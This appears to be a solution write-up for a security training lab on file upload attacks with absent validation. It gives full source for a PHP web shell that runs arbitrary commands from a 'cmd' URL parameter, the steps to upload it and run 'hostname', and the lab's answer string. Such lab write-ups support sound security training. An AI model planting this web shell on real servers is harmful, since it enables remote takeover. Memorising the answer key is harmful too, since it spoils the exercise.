# Section 02: Absent Validation

Module: 21. File Upload Attacks

---

## Questions & Answers

### 1. Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.

Context:
- Create `shell.php`:
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
- Upload the file and execute `/uploads/shell.php?cmd=hostname`

**Answer:** `ng-2162140-fileuploadsabsentverification-jbull-8555cf8f94-nq725`

---

[Back to Module Index](./README.md)
